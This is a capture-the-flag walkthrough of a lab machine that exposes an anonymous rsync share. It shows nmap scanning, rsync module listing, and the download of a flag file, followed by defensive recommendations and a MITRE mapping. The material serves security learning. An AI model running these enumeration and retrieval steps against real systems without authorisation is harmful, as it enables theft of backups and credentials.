# 🚩 Rsync Anonymous Share Misconfiguration Walkthrough



<p align="center">
<img src="https://img.shields.io/badge/Difficulty-Easy-green">
<img src="https://img.shields.io/badge/Category-Enumeration-blue">
<img src="https://img.shields.io/badge/Service-Rsync-orange">
<img src="https://img.shields.io/badge/Attack-Misconfiguration-red">
</p>

---

# 📌 Overview

This machine demonstrates how a seemingly harmless service can become an attack vector due to weak configuration practices.

The target exposed an **Rsync service (Port 873)** with **anonymous access enabled**, allowing an attacker to enumerate available modules and retrieve files without authentication.

---

# 🎯 Objective

- Enumerate exposed services
- Identify accessible Rsync modules
- Enumerate files
- Retrieve sensitive information
- Understand real-world impact

---

# 🧠 Initial Reconnaissance

Started with a service scan:

```bash
nmap -sV -p- 10.129.228.37
```

### Scan Result

```bash
Nmap scan report for 10.129.228.37
Host is up (0.46s latency)

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

---

# 🔎 Analysis

Only one service was exposed:

| Port | Service | Observation |
|-------|----------|-------------|
| 873 | Rsync | Anonymous enumeration possible |

Interesting finding:

> Rsync commonly stores backups and synchronized data.

Potential risks:

- Backup leakage
- Credentials exposure
- Internal configuration disclosure
- Sensitive file exposure

---

# 📡 Enumeration

List available Rsync modules:

```bash
rsync --list-only 10.129.228.37::
```

Output:

```bash
public          Anonymous Share
```

---

# 🧠 Attacker Thought Process

```text
Open Port Found
        ↓
Rsync Detected
        ↓
Enumerate Modules
        ↓
Anonymous Share Found
        ↓
Enumerate Contents
        ↓
Download Files
```

---

# 📂 Enumerating Module Contents

Command:

```bash
rsync --list-only 10.129.228.37::public
```

Output:

```bash
drwxr-xr-x          4096 .
-rw-r--r--            33 flag.txt
```

Discovered:

📄 `flag.txt`

---

# ⚔️ Exploitation

Download the file:

```bash
rsync -av 10.129.228.37::public/flag.txt ./
```

Result:

```bash
receiving incremental file list
flag.txt

sent 49 bytes
received 115 bytes
```

Read the file:

```bash
cat flag.txt
```

Output:

```text
HTB{REDACTED}
```

---

# 🗺️ Attack Flow

```text
Nmap Scan
     ↓
Port 873 Discovered
     ↓
Rsync Enumeration
     ↓
Anonymous Module Found
     ↓
Enumerate Contents
     ↓
File Discovery
     ↓
Download File
     ↓
Flag Retrieved
```

---

# 🔥 Real World Impact

If this were a production environment, attackers might retrieve:

- SSH Keys
- Database Dumps
- Backup Archives
- Application Source Code
- Configuration Files
- Credentials
- Internal Documentation

No exploit required.

No malware required.

Only a configuration mistake.

---

# 🛡️ Defensive Recommendations

✅ Disable anonymous access

✅ Restrict Rsync to internal networks

✅ Enable authentication

✅ Use firewall restrictions

✅ Regularly audit exposed services

✅ Monitor access logs

---

# 📚 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| Network Service Discovery | T1046 |
| Data from Information Repositories | T1213 |
| Data Staged | T1074 |

---

# 💡 Key Takeaway

> "Attackers don't always break the door down. Sometimes they simply try the handle."

---

# 🧰 Tools Used

- Nmap
- Rsync
- Linux CLI

---

# 👨‍💻 Author

**TM Manju**

Security Engineer | Application Security | Cloud Security | Pentesting | DevSecOps

LinkedIn: <your-link>

GitHub: <your-link>
